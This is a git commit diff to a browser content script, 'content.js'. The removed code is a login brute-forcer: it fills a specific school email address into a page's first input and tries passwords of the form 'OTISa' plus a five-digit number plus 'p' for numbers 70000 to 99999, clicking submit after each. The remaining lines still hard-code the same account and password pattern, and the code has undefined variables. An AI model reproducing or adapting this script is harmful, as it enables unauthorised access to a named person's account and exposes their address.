777fcefa7b8a6901209e2e97df0a7f2b30f85c2d
Moomoomooo <83972202+Moomoomooo@users.noreply.github.com>
2025-10-23 12:17:57 -0400

    Update content.js

--- src/content.js
+++ src/content.js
@@ -1,30 +1,8 @@
-let inputCounter;
-let firstInput;
-let secondInput;
-for (const child of document.body.children) {
-  if (child.tagName === 'INPUT' || child.tagName === 'TEXTAREA') {
-    if (counter === 0) {
-      firstInput = child
-      inputCounter++
-    } else {
-      secondInput = child
-    }
-  } else if (child.tagName === "BUTTON") {
-    submitButton = child;
-  }
-}
 
-for (let i = 70000; i < 100000; i++) {
-  if (firstInput) {
-    firstInput.value = "26ponirosa@oceanschools.org"
-  }
-  if (secondInput) {
-    secondInput.value = "OTISa" + format(i) + "p"
-  }
 
-  submitButton.dispatchEvent(new PointerEvent('click'))
-}
 
+firstInput.value = "26ponirosa@oceanschools.org"
+secondInput.value = "OTISa" + format(i) + "p"
 
 function format(integer) {
   let value = "00000" + integer
